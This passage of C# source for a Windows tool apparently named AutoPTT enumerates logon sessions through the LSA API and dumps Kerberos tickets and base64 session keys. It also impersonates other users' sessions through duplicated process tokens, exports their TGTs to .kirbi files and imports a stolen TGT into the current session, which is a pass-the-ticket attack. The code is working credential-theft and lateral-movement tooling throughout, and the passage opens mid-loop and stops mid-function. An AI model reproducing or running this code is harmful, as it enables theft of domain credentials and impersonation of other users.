                for (int j = 0; j < ticketCount; j++)
                {
                    IntPtr ticketAddr = new IntPtr(responsePtr.ToInt64() + ticketsOffset + 
                        j * Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO_EX)));
                    KERB_TICKET_CACHE_INFO_EX ticketInfo = (KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(
                        ticketAddr, typeof(KERB_TICKET_CACHE_INFO_EX));

                    string clientName = UnicodeStringToString(ticketInfo.ClientName);
                    string clientRealm = UnicodeStringToString(ticketInfo.ClientRealm);
                    string serverName = UnicodeStringToString(ticketInfo.ServerName);
                    string serverRealm = UnicodeStringToString(ticketInfo.ServerRealm);
                    DateTime startTime = FiletimeToDateTime(ticketInfo.StartTime);
                    DateTime endTime = FiletimeToDateTime(ticketInfo.EndTime);
                    DateTime renewTime = FiletimeToDateTime(ticketInfo.RenewTime);
                    string flagsStr = FormatTicketFlags(ticketInfo.TicketFlags);

                    bool isTgt = serverName.ToLower().Contains("krbtgt");

                    if (isTgt)
                    {
                        tgtCount++;
                        AddTgtToList(sessionLuid.LowPart, username, domain, serverName);
                    }
                    else
                        serviceCount++;

                    Console.WriteLine($"\n    ServiceName              :  {serverName}");
                    Console.WriteLine($"    ServiceRealm             :  {serverRealm}");
                    Console.WriteLine($"    UserName                 :  {clientName}");
                    Console.WriteLine($"    UserRealm                :  {clientRealm}");
                    Console.WriteLine($"    StartTime                :  {startTime:MM/dd/yyyy HH:mm:ss}");
                    Console.WriteLine($"    EndTime                  :  {endTime:MM/dd/yyyy HH:mm:ss}");
                    Console.WriteLine($"    RenewTill                :  {renewTime:MM/dd/yyyy HH:mm:ss}");
                    Console.WriteLine($"    Flags                    :  {flagsStr}");

                    var result = RequestServiceTicket(lsaHandle, authPack, sessionLuid, serverName, 
                        ticketInfo.TicketFlags);

                    if (result.Item2 != null)
                    {
                        string base64Key = Convert.ToBase64String(result.Item2);
                        Console.WriteLine($"    Base64(key)              :  {base64Key}");
                    }
                    else
                    {
                        Console.WriteLine($"    Base64(key)              :  (not available)");
                    }

                    Console.WriteLine($"    Base64EncodedTicket   :");
                    if (result.Item1 != null)
                    {
                        string base64Ticket = Convert.ToBase64String(result.Item1);
                        Console.WriteLine($"      {base64Ticket}");
                    }
                    else
                    {
                        Console.WriteLine($"      (failed to retrieve)");
                    }

                    Console.WriteLine();
                }

                LsaFreeReturnBuffer(responsePtr);
                LsaFreeReturnBuffer(sessionDataPtr);
            }

            Console.WriteLine(new string('=', 80));
            Console.WriteLine("  SUMMARY");
            Console.WriteLine(new string('=', 80));
            Console.WriteLine($"Total logon sessions analyzed: {totalSessions}");
            Console.WriteLine($"Sessions with Kerberos tickets: {sessionsWithTickets}");
            Console.WriteLine($"Total tickets found: {totalTickets}");
            Console.WriteLine($"  - TGTs: {tgtCount}");
            Console.WriteLine($"  - Service Tickets: {serviceCount}");

            LsaFreeReturnBuffer(sessionList);
            LsaDeregisterLogonProcess(lsaHandle);
        }


        static void ExportTicket(string logonIdStr)
        {
            uint targetLogonId;

            try
            {
                if (logonIdStr.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
                    targetLogonId = Convert.ToUInt32(logonIdStr, 16);
                else
                    targetLogonId = Convert.ToUInt32(logonIdStr, 16);
            }
            catch
            {
                Console.WriteLine("Error: Invalid LogonId format. Use hex format like 0x79fb3 or 79fb3");
                return;
            }

            EnableDebugPrivilege();

            uint sessionCount;
            IntPtr sessionList;
            int status = LsaEnumerateLogonSessions(out sessionCount, out sessionList);
            if (status != 0)
            {
                Console.WriteLine("[-] Failed to enumerate logon sessions");
                return;
            }

            LUID? targetLuid = null;
            string username = "";
            string domain = "";

            for (int i = 0; i < sessionCount; i++)
            {
                IntPtr currentPtr = new IntPtr(sessionList.ToInt64() + i * Marshal.SizeOf(typeof(LUID)));
                LUID sessionLuid = (LUID)Marshal.PtrToStructure(currentPtr, typeof(LUID));

                if (sessionLuid.LowPart == targetLogonId)
                {
                    targetLuid = sessionLuid;

                    IntPtr sessionDataPtr;
                    if (LsaGetLogonSessionData(ref sessionLuid, out sessionDataPtr) == 0 && 
                        sessionDataPtr != IntPtr.Zero)
                    {
                        SECURITY_LOGON_SESSION_DATA sessionData = (SECURITY_LOGON_SESSION_DATA)
                            Marshal.PtrToStructure(sessionDataPtr, typeof(SECURITY_LOGON_SESSION_DATA));
                        username = UnicodeStringToString(sessionData.UserName);
                        domain = UnicodeStringToString(sessionData.LogonDomain);
                        LsaFreeReturnBuffer(sessionDataPtr);
                    }
                    break;
                }
            }

            LsaFreeReturnBuffer(sessionList);

            if (!targetLuid.HasValue)
            {
                Console.WriteLine($"Error: LogonId 0x{targetLogonId:x} not found");
                return;
            }

            IntPtr lsaHandle = GetLsaHandleWithImpersonation();
            if (lsaHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get LSA handle");
                return;
            }

            IntPtr hImpToken = ImpersonateSession(targetLogonId);
            bool needRevert = false;

            if (hImpToken != IntPtr.Zero)
            {
                if (ImpersonateLoggedOnUser(hImpToken))
                {
                    needRevert = true;
                }
                else
                {
                    CloseHandle(hImpToken);
                    hImpToken = IntPtr.Zero;
                }
            }

            LSA_STRING pkgName = new LSA_STRING();
            byte[] pkgNameBytes = System.Text.Encoding.ASCII.GetBytes("Kerberos");
            IntPtr pkgNamePtr = Marshal.AllocHGlobal(pkgNameBytes.Length);
            Marshal.Copy(pkgNameBytes, 0, pkgNamePtr, pkgNameBytes.Length);
            pkgName.Buffer = pkgNamePtr;
            pkgName.Length = (ushort)pkgNameBytes.Length;
            pkgName.MaximumLength = (ushort)(pkgNameBytes.Length + 1);

            uint authPack;
            status = LsaLookupAuthenticationPackage(lsaHandle, ref pkgName, out authPack);
            Marshal.FreeHGlobal(pkgNamePtr);

            if (status != 0)
            {
                Console.WriteLine("[-] Failed to find Kerberos package");
                LsaDeregisterLogonProcess(lsaHandle);
                if (needRevert)
                {
                    RevertToSelf();
                    CloseHandle(hImpToken);
                }
                return;
            }

            KERB_QUERY_TKT_CACHE_REQUEST cacheRequest = new KERB_QUERY_TKT_CACHE_REQUEST();
            cacheRequest.MessageType = KerbQueryTicketCacheMessage;
            cacheRequest.LogonId = new LUID(0, 0);

            IntPtr requestPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheRequest));
            Marshal.StructureToPtr(cacheRequest, requestPtr, false);

            IntPtr responsePtr;
            uint responseSize;
            int protocolStatus;

            status = LsaCallAuthenticationPackage(lsaHandle, authPack, requestPtr, 
                (uint)Marshal.SizeOf(cacheRequest), out responsePtr, out responseSize, out protocolStatus);

            Marshal.FreeHGlobal(requestPtr);

            if (status != 0 || protocolStatus != 0)
            {
                Console.WriteLine($"Error: Failed to get ticket cache for LogonId 0x{targetLogonId:x}");
                LsaDeregisterLogonProcess(lsaHandle);
                if (needRevert)
                {
                    RevertToSelf();
                    CloseHandle(hImpToken);
                }
                return;
            }

            KERB_QUERY_TKT_CACHE_RESPONSE cacheResponse = (KERB_QUERY_TKT_CACHE_RESPONSE)
                Marshal.PtrToStructure(responsePtr, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));
            uint ticketCount = cacheResponse.CountOfTickets;

            string targetServer = null;
            uint ticketFlags = 0;
            int ticketsOffset = Marshal.SizeOf(typeof(KERB_QUERY_TKT_CACHE_RESPONSE));

            for (int i = 0; i < ticketCount; i++)
            {
                IntPtr ticketAddr = new IntPtr(responsePtr.ToInt64() + ticketsOffset + 
                    i * Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO)));
                KERB_TICKET_CACHE_INFO ticket = (KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(ticketAddr, 
                    typeof(KERB_TICKET_CACHE_INFO));
                string serverName = UnicodeStringToString(ticket.ServerName);

                if (serverName.ToLower().Contains("krbtgt"))
                {
                    targetServer = serverName;
                    ticketFlags = ticket.TicketFlags;
                    break;
                }
            }

            LsaFreeReturnBuffer(responsePtr);

            if (targetServer == null)
            {
                Console.WriteLine($"Error: No TGT found for LogonId 0x{targetLogonId:x}");
                LsaDeregisterLogonProcess(lsaHandle);
                if (needRevert)
                {
                    RevertToSelf();
                    CloseHandle(hImpToken);
                }
                return;
            }

            byte[] targetNameBytes = System.Text.Encoding.Unicode.GetBytes(targetServer);
            int structSize = Marshal.SizeOf(typeof(KERB_RETRIEVE_TKT_REQUEST));
            int totalSize = structSize + targetNameBytes.Length + 2;

            IntPtr requestPtr2 = Marshal.AllocHGlobal(totalSize);

            KERB_RETRIEVE_TKT_REQUEST request = new KERB_RETRIEVE_TKT_REQUEST();
            request.MessageType = KerbRetrieveEncodedTicketMessage;
            request.LogonId = new LUID(0, 0);
            request.TargetName = new LSA_UNICODE_STRING();
            request.TargetName.Length = (ushort)targetNameBytes.Length;
            request.TargetName.MaximumLength = (ushort)(targetNameBytes.Length + 2);
            request.TargetName.Buffer = new IntPtr(requestPtr2.ToInt64() + structSize);
            request.TicketFlags = ticketFlags;
            request.CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
            request.EncryptionType = 0;
            request.CredentialsHandle = new SECURITY_HANDLE();

            Marshal.StructureToPtr(request, requestPtr2, false);
            Marshal.Copy(targetNameBytes, 0, new IntPtr(requestPtr2.ToInt64() + structSize), 
                targetNameBytes.Length);

            IntPtr responsePtr2;
            uint responseSize2;
            int protocolStatus2;

            status = LsaCallAuthenticationPackage(lsaHandle, authPack, requestPtr2, (uint)totalSize, 
                out responsePtr2, out responseSize2, out protocolStatus2);

            Marshal.FreeHGlobal(requestPtr2);

            if (needRevert)
            {
                RevertToSelf();
                CloseHandle(hImpToken);
            }

            if (status != 0 || protocolStatus2 != 0 || responseSize2 == 0)
            {
                Console.WriteLine($"Error: Failed to retrieve ticket - Status=0x{status:X8}, " +
                    $"SubStatus=0x{protocolStatus2:X8}");
                if (responsePtr2 != IntPtr.Zero)
                    LsaFreeReturnBuffer(responsePtr2);
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            byte[] fullResponseBuffer = new byte[responseSize2];
            Marshal.Copy(responsePtr2, fullResponseBuffer, 0, (int)responseSize2);

            KERB_RETRIEVE_TKT_RESPONSE response = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(responsePtr2, 
                typeof(KERB_RETRIEVE_TKT_RESPONSE));

            if (response.Ticket.EncodedTicketSize <= 0 || response.Ticket.EncodedTicket == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to extract ticket data");
                LsaFreeReturnBuffer(responsePtr2);
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            long ticketPtrAddr = response.Ticket.EncodedTicket.ToInt64();
            long responseBaseAddr = responsePtr2.ToInt64();
            int ticketOffset = (int)(ticketPtrAddr - responseBaseAddr);
            int ticketSize = response.Ticket.EncodedTicketSize;

            byte[] ticketBytes = new byte[ticketSize];
            Array.Copy(fullResponseBuffer, ticketOffset, ticketBytes, 0, ticketSize);

            string cleanUsername = string.IsNullOrEmpty(username) ? "unknown" : username;
            char[] invalidChars = { '/', '\\', ':', '*', '?', '"', '<', '>', '|', '@', ' ', '$' };
            foreach (char c in invalidChars)
            {
                cleanUsername = cleanUsername.Replace(c, '_');
            }

            string filename = $"0x{targetLogonId:x}_{cleanUsername}.kirbi";

            System.IO.File.WriteAllBytes(filename, ticketBytes);

            Console.WriteLine("\n[+] TGT ticket exported successfully");
            Console.WriteLine($"    LogonId: 0x{targetLogonId:x}");
            Console.WriteLine($"    User: {domain}\\{username}");
            Console.WriteLine($"    Server: {targetServer}");
            Console.WriteLine($"    File: {filename}");
            Console.WriteLine($"    Size: {ticketBytes.Length} bytes");

            LsaFreeReturnBuffer(responsePtr2);
            LsaDeregisterLogonProcess(lsaHandle);
        }


        static void AddTgtToList(uint logonId, string username, string domain, string serviceName)
        {
            foreach (var tgt in g_tgtList)
            {
                if (tgt.LogonId == logonId && tgt.ServiceName == serviceName)
                    return;
            }

            g_tgtList.Add(new TgtInfo
            {
                LogonId = logonId,
                Username = string.IsNullOrEmpty(username) ? "(unknown)" : username,
                Domain = string.IsNullOrEmpty(domain) ? "(unknown)" : domain,
                ServiceName = string.IsNullOrEmpty(serviceName) ? "(unknown)" : serviceName
            });
        }


        static IntPtr ImpersonateSession(uint targetLogonId)
        {
            IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot == new IntPtr(-1))
                return IntPtr.Zero;

            PROCESSENTRY32W pe = new PROCESSENTRY32W();
            pe.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32W));

            if (!Process32First(hSnapshot, ref pe))
            {
                CloseHandle(hSnapshot);
                return IntPtr.Zero;
            }

            do
            {
                IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, pe.th32ProcessID);
                if (hProcess != IntPtr.Zero)
                {
                    IntPtr hToken;
                    if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, out hToken))
                    {
                        TOKEN_STATISTICS stats = new TOKEN_STATISTICS();
                        uint returnLength;
                        IntPtr statsPtr = Marshal.AllocHGlobal(Marshal.SizeOf(stats));

                        if (GetTokenInformation(hToken, TOKEN_STATISTICS_INFO_CLASS, statsPtr, 
                            (uint)Marshal.SizeOf(stats), out returnLength))
                        {
                            stats = (TOKEN_STATISTICS)Marshal.PtrToStructure(statsPtr, typeof(TOKEN_STATISTICS));

                            if (stats.AuthenticationId.LowPart == targetLogonId)
                            {
                                IntPtr hImpToken;
                                if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, IntPtr.Zero, SecurityImpersonation, 
                                    TokenImpersonation, out hImpToken))
                                {
                                    Marshal.FreeHGlobal(statsPtr);
                                    CloseHandle(hToken);
                                    CloseHandle(hProcess);
                                    CloseHandle(hSnapshot);
                                    return hImpToken;
                                }
                            }
                        }

                        Marshal.FreeHGlobal(statsPtr);
                        CloseHandle(hToken);
                    }
                    CloseHandle(hProcess);
                }
            } while (Process32Next(hSnapshot, ref pe));

            CloseHandle(hSnapshot);
            return IntPtr.Zero;
        }


        static void AutoExportAndImport()
        {
            g_tgtList.Clear();

            Console.WriteLine("[*] Auto mode: Enumerating tickets and importing selected TGT...");
            PrintCurrentLogonId();

            EnableDebugPrivilege();

            IntPtr lsaHandle = GetLsaHandleWithImpersonation();
            if (lsaHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get LSA handle");
                return;
            }

            LSA_STRING pkgName = new LSA_STRING();
            byte[] pkgNameBytes = System.Text.Encoding.ASCII.GetBytes("Kerberos");
            IntPtr pkgNamePtr = Marshal.AllocHGlobal(pkgNameBytes.Length);
            Marshal.Copy(pkgNameBytes, 0, pkgNamePtr, pkgNameBytes.Length);
            pkgName.Buffer = pkgNamePtr;
            pkgName.Length = (ushort)pkgNameBytes.Length;
            pkgName.MaximumLength = (ushort)(pkgNameBytes.Length + 1);

            uint authPack;
            int status = LsaLookupAuthenticationPackage(lsaHandle, ref pkgName, out authPack);
            Marshal.FreeHGlobal(pkgNamePtr);

            if (status != 0)
            {
                Console.WriteLine($"[-] Failed to lookup Kerberos package: 0x{status:X8}");
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            uint sessionCount;
            IntPtr sessionList;
            status = LsaEnumerateLogonSessions(out sessionCount, out sessionList);
            if (status != 0)
            {
                Console.WriteLine($"[-] Failed to enumerate sessions: 0x{status:X8}");
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            for (int i = 0; i < sessionCount; i++)
            {
                IntPtr currentPtr = new IntPtr(sessionList.ToInt64() + i * Marshal.SizeOf(typeof(LUID)));
                LUID sessionLuid = (LUID)Marshal.PtrToStructure(currentPtr, typeof(LUID));

                IntPtr sessionDataPtr;
                status = LsaGetLogonSessionData(ref sessionLuid, out sessionDataPtr);

                if (status != 0 || sessionDataPtr == IntPtr.Zero)
                    continue;

                SECURITY_LOGON_SESSION_DATA sessionData = (SECURITY_LOGON_SESSION_DATA)
                    Marshal.PtrToStructure(sessionDataPtr, typeof(SECURITY_LOGON_SESSION_DATA));

                string username = UnicodeStringToString(sessionData.UserName);
                string domain = UnicodeStringToString(sessionData.LogonDomain);

                if (string.IsNullOrEmpty(username))
                {
                    LsaFreeReturnBuffer(sessionDataPtr);
                    continue;
                }

                KERB_QUERY_TKT_CACHE_REQUEST cacheRequest = new KERB_QUERY_TKT_CACHE_REQUEST();
                cacheRequest.MessageType = KerbQueryTicketCacheExMessage;
                cacheRequest.LogonId = sessionLuid;

                IntPtr requestPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheRequest));
                Marshal.StructureToPtr(cacheRequest, requestPtr, false);

                IntPtr responsePtr;
                uint responseSize;
                int protocolStatus;

                status = LsaCallAuthenticationPackage(lsaHandle, authPack, requestPtr, 
                    (uint)Marshal.SizeOf(cacheRequest), out responsePtr, out responseSize, out protocolStatus);

                Marshal.FreeHGlobal(requestPtr);

                if (status != 0 || protocolStatus != 0 || responsePtr == IntPtr.Zero)
                {
                    LsaFreeReturnBuffer(sessionDataPtr);
                    continue;
                }

                KERB_QUERY_TKT_CACHE_RESPONSE cacheResponse = (KERB_QUERY_TKT_CACHE_RESPONSE)
                    Marshal.PtrToStructure(responsePtr, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));
                uint ticketCount = cacheResponse.CountOfTickets;

                if (ticketCount == 0)
                {
                    LsaFreeReturnBuffer(responsePtr);
                    LsaFreeReturnBuffer(sessionDataPtr);
                    continue;
                }

                int ticketsOffset = Marshal.SizeOf(typeof(KERB_QUERY_TKT_CACHE_RESPONSE));

                for (int j = 0; j < ticketCount; j++)
                {
                    IntPtr ticketAddr = new IntPtr(responsePtr.ToInt64() + ticketsOffset + 
                        j * Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO_EX)));
                    KERB_TICKET_CACHE_INFO_EX ticketInfo = (KERB_TICKET_CACHE_INFO_EX)
                        Marshal.PtrToStructure(ticketAddr, typeof(KERB_TICKET_CACHE_INFO_EX));

                    string serverName = UnicodeStringToString(ticketInfo.ServerName);

                    bool isTgt = serverName.ToLower().Contains("krbtgt");
                    if (isTgt)
                    {
                        AddTgtToList(sessionLuid.LowPart, username, domain, serverName);
                    }
                }

                LsaFreeReturnBuffer(responsePtr);
                LsaFreeReturnBuffer(sessionDataPtr);
            }

            LsaFreeReturnBuffer(sessionList);

            if (g_tgtList.Count == 0)
            {
                Console.WriteLine("\nNo TGTs found on the system.");
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            Console.WriteLine("\n" + new string('=', 80));
            Console.WriteLine("  AVAILABLE TGTs");
            Console.WriteLine(new string('=', 80));
            Console.WriteLine($"{"Index",-6} {"LogonId",-12} {"User",-30} {"Domain",-20} Service");
            Console.WriteLine($"{new string('-', 6)} {new string('-', 12)} {new string('-', 30)} " +
                $"{new string('-', 20)} {new string('-', 32)}");

            for (int idx = 0; idx < g_tgtList.Count; idx++)
            {
                TgtInfo tgt = g_tgtList[idx];
                Console.WriteLine($"{idx + 1,-6} 0x{tgt.LogonId,-10:x} {tgt.Username,-30} " +
                    $"{tgt.Domain,-20} {tgt.ServiceName}");
            }

            Console.Write($"\nChoose TGT to export and import (1-{g_tgtList.Count}), or 0 to cancel: ");
            string input = Console.ReadLine();

            int choice;
            if (!int.TryParse(input, out choice) || choice <= 0 || choice > g_tgtList.Count)
            {
                Console.WriteLine("Cancelled or invalid choice.");
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            TgtInfo selectedTgt = g_tgtList[choice - 1];
            uint targetLogonId = selectedTgt.LogonId;

            Console.WriteLine($"\n[*] Selected: #{choice} - 0x{targetLogonId:x} ({selectedTgt.Username})");

            IntPtr hImpToken = ImpersonateSession(targetLogonId);
            bool needRevert = false;

            if (hImpToken != IntPtr.Zero)
            {
                if (ImpersonateLoggedOnUser(hImpToken))
                {
                    needRevert = true;
                }
                else
                {
                    CloseHandle(hImpToken);
                    hImpToken = IntPtr.Zero;
                }
            }

            KERB_QUERY_TKT_CACHE_REQUEST cacheRequest2 = new KERB_QUERY_TKT_CACHE_REQUEST();
            cacheRequest2.MessageType = KerbQueryTicketCacheMessage;
            cacheRequest2.LogonId = new LUID(0, 0);

            IntPtr requestPtr2 = Marshal.AllocHGlobal(Marshal.SizeOf(cacheRequest2));
            Marshal.StructureToPtr(cacheRequest2, requestPtr2, false);

            IntPtr responsePtr2;
            uint responseSize2;
            int protocolStatus2;

            status = LsaCallAuthenticationPackage(lsaHandle, authPack, requestPtr2, 
                (uint)Marshal.SizeOf(cacheRequest2), out responsePtr2, out responseSize2, out protocolStatus2);

            Marshal.FreeHGlobal(requestPtr2);

            if (status != 0 || protocolStatus2 != 0)
            {
                Console.WriteLine("[-] Failed to get ticket cache");
                if (needRevert)
                {
                    RevertToSelf();
                    CloseHandle(hImpToken);
                }
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            KERB_QUERY_TKT_CACHE_RESPONSE cacheResponse2 = (KERB_QUERY_TKT_CACHE_RESPONSE)
                Marshal.PtrToStructure(responsePtr2, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));
            uint ticketCount2 = cacheResponse2.CountOfTickets;

            string targetServer = null;
            uint ticketFlags = 0;
            int ticketsOffset2 = Marshal.SizeOf(typeof(KERB_QUERY_TKT_CACHE_RESPONSE));

            for (int i = 0; i < ticketCount2; i++)
            {
                IntPtr ticketAddr = new IntPtr(responsePtr2.ToInt64() + ticketsOffset2 + 
                    i * Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO)));
                KERB_TICKET_CACHE_INFO ticket = (KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(ticketAddr, 
                    typeof(KERB_TICKET_CACHE_INFO));
                string serverName = UnicodeStringToString(ticket.ServerName);

                if (serverName.ToLower().Contains("krbtgt"))
                {
                    targetServer = serverName;
                    ticketFlags = ticket.TicketFlags;
                    break;
                }
            }

            LsaFreeReturnBuffer(responsePtr2);

            if (targetServer == null)
            {
                Console.WriteLine("[-] TGT not found in cache");
                if (needRevert)
                {
                    RevertToSelf();
                    CloseHandle(hImpToken);
                }
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            byte[] targetNameBytes = System.Text.Encoding.Unicode.GetBytes(targetServer);
            int structSize = Marshal.SizeOf(typeof(KERB_RETRIEVE_TKT_REQUEST));
            int totalSize = structSize + targetNameBytes.Length + 2;

            IntPtr requestPtr3 = Marshal.AllocHGlobal(totalSize);

            KERB_RETRIEVE_TKT_REQUEST request = new KERB_RETRIEVE_TKT_REQUEST();
            request.MessageType = KerbRetrieveEncodedTicketMessage;
            request.LogonId = new LUID(0, 0);
            request.TargetName = new LSA_UNICODE_STRING();
            request.TargetName.Length = (ushort)targetNameBytes.Length;
            request.TargetName.MaximumLength = (ushort)(targetNameBytes.Length + 2);
            request.TargetName.Buffer = new IntPtr(requestPtr3.ToInt64() + structSize);
            request.TicketFlags = ticketFlags;
            request.CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
            request.EncryptionType = 0;
            request.CredentialsHandle = new SECURITY_HANDLE();

            Marshal.StructureToPtr(request, requestPtr3, false);
            Marshal.Copy(targetNameBytes, 0, new IntPtr(requestPtr3.ToInt64() + structSize), 
                targetNameBytes.Length);

            IntPtr responsePtr3;
            uint responseSize3;
            int protocolStatus3;

            status = LsaCallAuthenticationPackage(lsaHandle, authPack, requestPtr3, (uint)totalSize, 
                out responsePtr3, out responseSize3, out protocolStatus3);

            Marshal.FreeHGlobal(requestPtr3);

            if (needRevert)
            {
                RevertToSelf();
                CloseHandle(hImpToken);
            }

            if (status != 0 || protocolStatus3 != 0 || responseSize3 == 0)
            {
                Console.WriteLine($"[-] Failed to retrieve ticket - Status=0x{status:X8}, " +
                    $"SubStatus=0x{protocolStatus3:X8}");
                if (responsePtr3 != IntPtr.Zero)
                    LsaFreeReturnBuffer(responsePtr3);
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            byte[] fullResponseBuffer = new byte[responseSize3];
            Marshal.Copy(responsePtr3, fullResponseBuffer, 0, (int)responseSize3);

            KERB_RETRIEVE_TKT_RESPONSE response = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(responsePtr3, 
                typeof(KERB_RETRIEVE_TKT_RESPONSE));

            if (response.Ticket.EncodedTicketSize <= 0 || response.Ticket.EncodedTicket == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to extract ticket data");
                LsaFreeReturnBuffer(responsePtr3);
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            long ticketPtrAddr = response.Ticket.EncodedTicket.ToInt64();
            long responseBaseAddr = responsePtr3.ToInt64();
            int ticketOffset = (int)(ticketPtrAddr - responseBaseAddr);
            int ticketSize = response.Ticket.EncodedTicketSize;

            byte[] ticketBytes = new byte[ticketSize];
            Array.Copy(fullResponseBuffer, ticketOffset, ticketBytes, 0, ticketSize);

            Console.WriteLine("[+] Ticket retrieved successfully");
            Console.WriteLine($"    Size: {ticketBytes.Length} bytes");

            LsaFreeReturnBuffer(responsePtr3);

            Console.WriteLine("\n[*] Importing ticket into current session...");

            int submitStructSize = Marshal.SizeOf(typeof(KERB_SUBMIT_TKT_REQUEST));
            int submitSize = submitStructSize + ticketBytes.Length;

            IntPtr submitPtr = Marshal.AllocHGlobal(submitSize);

            KERB_SUBMIT_TKT_REQUEST submitReq = new KERB_SUBMIT_TKT_REQUEST();
            submitReq.MessageType = KerbSubmitTicketMessage;
            submitReq.LogonId = new LUID(0, 0);
            submitReq.Flags = 0;
            submitReq.Key = new KERB_CRYPTO_KEY32();
            submitReq.Key.KeyType = 0;
            submitReq.Key.Length = 0;
            submitReq.Key.Offset = 0;
            submitReq.KerbCredSize = (uint)ticketBytes.Length;
            submitReq.KerbCredOffset = (uint)submitStructSize;

            Marshal.StructureToPtr(submitReq, submitPtr, false);
            Marshal.Copy(ticketBytes, 0, new IntPtr(submitPtr.ToInt64() + submitStructSize), ticketBytes.Length);

            IntPtr responsePtr4;
            uint responseSize4;
            int protocolStatus4;

            status = LsaCallAuthenticationPackage(lsaHandle, authPack, submitPtr, (uint)submitSize, 
                out responsePtr4, out responseSize4, out protocolStatus4);

            Marshal.FreeHGlobal(submitPtr);

            if (status != 0 || protocolStatus4 != 0)
            {
                Console.WriteLine($"\nError: Failed to import ticket");
                Console.WriteLine($"  Status: 0x{status:X8}");
                Console.WriteLine($"  SubStatus: 0x{protocolStatus4:X8}");

                if (protocolStatus4 == unchecked((int)0xC000018B) || protocolStatus4 == -1073741429)
                    Console.WriteLine("  Reason: Invalid or malformed ticket");
                else if (protocolStatus4 == unchecked((int)0xC0000225) || protocolStatus4 == -1073741275)
                    Console.WriteLine("  Reason: Domain not found");
                else if (protocolStatus4 == unchecked((int)0xC000005E) || protocolStatus4 == -1073741730)
                    Console.WriteLine("  Reason: No valid logon sessions");
                else if (protocolStatus4 == unchecked((int)0xC000000D) || protocolStatus4 == -1073741811)
                    Console.WriteLine("  Reason: Invalid parameter");

                if (responsePtr4 != IntPtr.Zero)
                    LsaFreeReturnBuffer(responsePtr4);
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            Console.WriteLine("\n[+] TGT imported successfully into current session");
            Console.WriteLine($"    LogonId: 0x{targetLogonId:x}");
            Console.WriteLine($"    User: {selectedTgt.Username}");
            Console.WriteLine($"    Service: {targetServer}");
            Console.WriteLine("\n[+] Ticket is now available in your Kerberos cache");
            Console.WriteLine($"    You can verify with: AutoPTT.exe klist");

            if (responsePtr4 != IntPtr.Zero)
                LsaFreeReturnBuffer(responsePtr4);
            LsaDeregisterLogonProcess(lsaHandle);
        }


        static void PassTheTicket(string filename)
        {
            if (!System.IO.File.Exists(filename))
            {
                Console.WriteLine($"Error: Cannot open file {filename}");
                return;
            }

            byte[] ticketData = System.IO.File.ReadAllBytes(filename);
            int fileSize = ticketData.Length;

            if (fileSize <= 0 || fileSize > 10 * 1024 * 1024)
            {
                Console.WriteLine("[-] Invalid file size");
                return;
            }

            IntPtr lsaHandle;
            int status = LsaConnectUntrusted(out lsaHandle);
            if (status != 0)
            {
                Console.WriteLine($"[-] LsaConnectUntrusted failed: 0x{status:X8}");
                return;
            }

            LSA_STRING pkgName = new LSA_STRING();
            byte[] pkgNameBytes = System.Text.Encoding.ASCII.GetBytes("Kerberos");
            IntPtr pkgNamePtr = Marshal.AllocHGlobal(pkgNameBytes.Length);
            Marshal.Copy(pkgNameBytes, 0, pkgNamePtr, pkgNameBytes.Length);
            pkgName.Buffer = pkgNamePtr;
            pkgName.Length = (ushort)pkgNameBytes.Length;
            pkgName.MaximumLength = (ushort)(pkgNameBytes.Length + 1);

            uint authPack;
            status = LsaLookupAuthenticationPackage(lsaHandle, ref pkgName, out authPack);
            Marshal.FreeHGlobal(pkgNamePtr);

            if (status != 0)
            {
                Console.WriteLine($"[-] LsaLookupAuthenticationPackage failed: 0x{status:X8}");
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            int structSize = Marshal.SizeOf(typeof(KERB_SUBMIT_TKT_REQUEST));
            int submitSize = structSize + fileSize;

            IntPtr submitPtr = Marshal.AllocHGlobal(submitSize);

            KERB_SUBMIT_TKT_REQUEST submitReq = new KERB_SUBMIT_TKT_REQUEST();
            submitReq.MessageType = KerbSubmitTicketMessage;
            submitReq.LogonId = new LUID(0, 0);
            submitReq.Flags = 0;
            submitReq.Key = new KERB_CRYPTO_KEY32();
            submitReq.Key.KeyType = 0;
            submitReq.Key.Length = 0;
            submitReq.Key.Offset = 0;
            submitReq.KerbCredSize = (uint)fileSize;
            submitReq.KerbCredOffset = (uint)structSize;

            Marshal.StructureToPtr(submitReq, submitPtr, false);
